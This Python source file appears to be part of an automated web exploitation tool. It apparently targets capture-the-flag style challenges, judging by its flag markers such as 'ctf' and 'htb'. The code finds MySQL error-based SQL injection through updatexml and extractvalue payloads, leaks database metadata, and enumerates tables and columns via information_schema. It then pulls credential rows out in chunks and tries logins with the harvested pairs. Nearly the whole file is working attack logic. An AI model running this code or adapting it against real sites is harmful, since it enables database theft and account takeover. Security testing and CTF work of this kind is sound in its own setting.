from __future__ import annotations

from ravage.web_core.proof_recognizer import recognize_proofs

from .auth import _credential_pairs_from_rows
from .common import _dedupe, _prioritize
from .context import ExtractorContext
from .models import (
    COMMON_COLUMNS,
    COMMON_TABLES,
    FAST_CREDENTIAL_COLUMNS,
    FAST_CREDENTIAL_TABLES,
    FAST_FLAG_COLUMNS,
    FAST_FLAG_TABLES,
    _ErrorPrimitive,
)
from .sql_helpers import (
    _clean_identifier,
    _error_payload,
    _extract_error_leak,
    _fallback_columns_for_table,
    _schema_match_expr,
    _split_sql_items,
    _sql_hex_string,
    _sql_ident,
    _useful_data_value,
    _useful_leak,
    _target_baseline_value,
    _prefixes,
)

_ERROR_VALUE_CHUNK_SIZE = 24
_DEFAULT_ERROR_VALUE_CHUNKS = 4
_PROOF_ERROR_VALUE_CHUNKS = 12


class ErrorBasedMixin(ExtractorContext):
    def _find_error_primitive(self, target: dict[str, object]) -> _ErrorPrimitive | None:
        input_name = str(target.get("input") or "")
        for prefix in _prefixes(_target_baseline_value(target, input_name, self.baseline_value)):
            for function_name in ("updatexml", "extractvalue"):
                payload = _error_payload(prefix, function_name, "database()")
                response = self._send(target, payload, phase="error_probe", expr="database()")
                if response is None:
                    return None
                leak = _extract_error_leak(response.body)
                if _useful_leak(leak):
                    primitive = _ErrorPrimitive(
                        target=target,
                        prefix=prefix,
                        function=function_name,
                        sample_payload=payload,
                        sample_leak=leak,
                    )
                    self.findings.append(
                        {
                            "type": "sql_error_leak_primitive",
                            "phase": "error_probe",
                            "target": self.target_brief(target),
                            "payload": payload,
                            "leak": leak,
                            "replay": self.replay_target(target, payload),
                        }
                    )
                    return primitive
        return None


    def _extract_error_based(self, primitive: _ErrorPrimitive) -> None:
        start_requests = len(self.requests)
        scalars = {
            "database": "database()",
            "version": "version()",
            "user": "user()",
            "datadir": "@@datadir",
        }
        scalar_values = {
            label: value
            for label, expr in scalars.items()
            if (value := self._error_leak(primitive, expr))
            and _useful_data_value(value)
        }
        if scalar_values:
            self.findings.append(
                {
                    "type": "sql_scalar_leaks",
                    "phase": "error_extract",
                    "target": self.target_brief(primitive.target),
                    "values": scalar_values,
                }
            )

        schema_match = _schema_match_expr(scalar_values.get("database", ""))
        tables = self._enumerate_tables(primitive, schema_match)
        columns_by_table = self._enumerate_columns(primitive, tables, schema_match)
        rows = self._extract_table_values(primitive, tables, columns_by_table)
        login_findings = self._try_logins(_credential_pairs_from_rows(rows)[:8]) if rows else []
        if self.proofs:
            self._append_error_summary(primitive, tables, columns_by_table, rows, login_findings)
            return
        if not tables and len(self.requests) - start_requests < 120 and self.budget > 60:
            rows.extend(self._extract_fast_error_values(primitive, max_requests=36))
            if not login_findings:
                login_findings = self._try_logins(_credential_pairs_from_rows(rows)[:8]) if rows else []
        if tables or columns_by_table or rows:
            self._append_error_summary(primitive, tables, columns_by_table, rows, login_findings)


    def _append_error_summary(
        self,
        primitive: _ErrorPrimitive,
        tables: list[str],
        columns_by_table: dict[str, list[str]],
        rows: list[dict[str, object]],
        login_findings: list[dict[str, object]] | None = None,
    ) -> None:
        self.findings.append(
            {
                "type": "sql_error_extraction_summary",
                "phase": "error_extract",
                "target": self.target_brief(primitive.target),
                "tables": tables[:30],
                "columns_by_table": {key: value[:30] for key, value in columns_by_table.items()},
                "rows": rows[:40],
                "login_attempts": (login_findings or [])[:12],
                "proofs": list(self.proofs),
            }
        )


    def _extract_fast_error_values(self, primitive: _ErrorPrimitive, *, max_requests: int) -> list[dict[str, object]]:
        rows: list[dict[str, object]] = []
        start_requests = len(self.requests)
        candidates: list[tuple[str, str, int]] = []
        for table in FAST_FLAG_TABLES:
            for column in FAST_FLAG_COLUMNS:
                candidates.append((table, column, 0))
        for table in FAST_CREDENTIAL_TABLES:
            for row_index in range(2):
                for column in FAST_CREDENTIAL_COLUMNS:
                    candidates.append((table, column, row_index))

        seen: set[tuple[str, str, int]] = set()
        for table, column, row_index in candidates:
            key = (table, column, row_index)
            if key in seen:
                continue
            seen.add(key)
            if self.budget <= 0 or len(self.requests) - start_requests >= max_requests:
                break
            value = self._chunked_error_value(primitive, table, column, row_index)
            if not _useful_data_value(value):
                continue
            rows.append({"table": table, "column": column, "row": row_index, "value": value})
            if self._register_error_value_proofs(value):
                return rows
        return rows


    def _error_leak(self, primitive: _ErrorPrimitive, expr: str) -> str:
        payload = _error_payload(primitive.prefix, primitive.function, expr)
        response = self._send(primitive.target, payload, phase="error_extract", expr=expr)
        if response is None:
            return ""
        return _extract_error_leak(response.body)


    def _enumerate_tables(self, primitive: _ErrorPrimitive, schema_match: str) -> list[str]:
        tables = self._table_names_from_group_concat(primitive, schema_match)
        if tables:
            return _prioritize(_dedupe(tables), COMMON_TABLES)

        tables = self._table_names_from_offsets(primitive, schema_match)
        return _prioritize(_dedupe(tables), COMMON_TABLES)


    def _table_names_from_group_concat(
        self,
        primitive: _ErrorPrimitive,
        schema_match: str,
    ) -> list[str]:
        expr = _table_group_concat_expr(schema_match)
        leak = self._error_leak(primitive, expr)
        return _split_sql_items(leak)


    def _table_names_from_offsets(
        self,
        primitive: _ErrorPrimitive,
        schema_match: str,
    ) -> list[str]:
        tables: list[str] = []
        for offset in range(8):
            expr = _table_at_offset_expr(schema_match, offset)
            table = _clean_identifier(self._error_leak(primitive, expr))
            if table:
                tables.append(table)
        return tables


    def _enumerate_columns(
        self,
        primitive: _ErrorPrimitive,
        tables: list[str],
        schema_match: str,
    ) -> dict[str, list[str]]:
        columns_by_table: dict[str, list[str]] = {}
        for table in _tables_for_column_enumeration(tables):
            columns = self._enumerate_columns_for_table(primitive, table, schema_match)
            if columns:
                columns_by_table[table] = columns
        return columns_by_table


    def _enumerate_columns_for_table(
        self,
        primitive: _ErrorPrimitive,
        table: str,
        schema_match: str,
    ) -> list[str]:
        columns = self._column_names_from_group_concat(primitive, table, schema_match)
        if not columns:
            columns = self._column_names_from_offsets(primitive, table, schema_match)
        return _prioritize(_dedupe(columns), COMMON_COLUMNS)


    def _column_names_from_group_concat(
        self,
        primitive: _ErrorPrimitive,
        table: str,
        schema_match: str,
    ) -> list[str]:
        expr = _column_group_concat_expr(schema_match, table)
        leak = self._error_leak(primitive, expr)
        return _split_sql_items(leak)


    def _column_names_from_offsets(
        self,
        primitive: _ErrorPrimitive,
        table: str,
        schema_match: str,
    ) -> list[str]:
        columns: list[str] = []
        for offset in range(8):
            expr = _column_at_offset_expr(schema_match, table, offset)
            column = _clean_identifier(self._error_leak(primitive, expr))
            if column:
                columns.append(column)
        return columns


    def _extract_table_values(
        self,
        primitive: _ErrorPrimitive,
        tables: list[str],
        columns_by_table: dict[str, list[str]],
    ) -> list[dict[str, object]]:
        rows: list[dict[str, object]] = []
        table_order = _tables_for_value_extraction(tables)
        for table in table_order[:8]:
            table_rows, found_proof = self._extract_values_from_table(
                primitive,
                table,
                columns_by_table,
            )
            rows.extend(table_rows)
            if found_proof:
                return rows
        return rows


    def _extract_values_from_table(
        self,
        primitive: _ErrorPrimitive,
        table: str,
        columns_by_table: dict[str, list[str]],
    ) -> tuple[list[dict[str, object]], bool]:
        rows: list[dict[str, object]] = []
        columns = _candidate_columns_for_table(table, columns_by_table)
        max_rows = _max_rows_for_table(table)

        for column in columns:
            for row_index in range(max_rows):
                row = self._extract_value_row(primitive, table, column, row_index)
                if row is None:
                    continue
                rows.append(row)
                if self._register_error_value_proofs(str(row.get("value") or "")):
                    return rows, True
        return rows, False


    def _extract_value_row(
        self,
        primitive: _ErrorPrimitive,
        table: str,
        column: str,
        row_index: int,
    ) -> dict[str, object] | None:
        value = self._chunked_error_value(primitive, table, column, row_index)
        if not _useful_data_value(value):
            return None
        return {"table": table, "column": column, "row": row_index, "value": value}


    def _chunked_error_value(self, primitive: _ErrorPrimitive, table: str, column: str, row_index: int) -> str:
        chunks: list[str] = []
        for index in range(_PROOF_ERROR_VALUE_CHUNKS):
            start = 1 + index * _ERROR_VALUE_CHUNK_SIZE
            expr = (
                f"select substring(cast({_sql_ident(column)} as char),{start},{_ERROR_VALUE_CHUNK_SIZE}) "
                f"from {_sql_ident(table)} limit {row_index},1"
            )
            chunk = self._error_leak(primitive, expr)
            if not _useful_data_value(chunk):
                break
            chunks.append(chunk)
            value = "".join(chunks)
            if len(chunk) < 20 or recognize_proofs(value):
                break
            if index + 1 >= _DEFAULT_ERROR_VALUE_CHUNKS and not _looks_like_unclosed_proof(value):
                break
        return "".join(chunks)

    def _register_error_value_proofs(self, value: str) -> bool:
        proofs = recognize_proofs(value)
        for proof in proofs:
            if proof not in self.proofs:
                self.proofs.append(proof)
        return bool(proofs)


def _table_group_concat_expr(schema_match: str) -> str:
    return f"select group_concat(table_name) from information_schema.tables where table_schema={schema_match}"


def _table_at_offset_expr(schema_match: str, offset: int) -> str:
    return (
        "select table_name from information_schema.tables "
        f"where table_schema={schema_match} limit {offset},1"
    )


def _tables_for_column_enumeration(tables: list[str]) -> list[str]:
    prioritized = _prioritize(tables, COMMON_TABLES)
    return prioritized[:8]


def _column_group_concat_expr(schema_match: str, table: str) -> str:
    table_match = _sql_hex_string(table)
    return (
        "select group_concat(column_name) from information_schema.columns "
        f"where table_schema={schema_match} and table_name={table_match}"
    )


def _column_at_offset_expr(schema_match: str, table: str, offset: int) -> str:
    table_match = _sql_hex_string(table)
    return (
        "select column_name from information_schema.columns "
        f"where table_schema={schema_match} and table_name={table_match} limit {offset},1"
    )


def _tables_for_value_extraction(tables: list[str]) -> list[str]:
    if tables:
        deduped = _dedupe(tables)
        return _prioritize(deduped, COMMON_TABLES)
    return list(COMMON_TABLES)


def _candidate_columns_for_table(
    table: str,
    columns_by_table: dict[str, list[str]],
) -> list[str]:
    columns = columns_by_table.get(table)
    if not columns:
        columns = _fallback_columns_for_table(table)
    prioritized = _prioritize(columns, COMMON_COLUMNS)
    return prioritized[:8]


def _max_rows_for_table(table: str) -> int:
    if table.lower() in FAST_CREDENTIAL_TABLES:
        return 2
    return 1


def _looks_like_unclosed_proof(value: str) -> bool:
    lowered = value.lower()
    brace_index = lowered.rfind("{")
    if brace_index < 0 or "}" in lowered[brace_index:]:
        return False
    prefix = lowered[max(0, brace_index - 16) : brace_index]
    return any(marker in prefix for marker in ("flag", "ctf", "htb", "xben"))
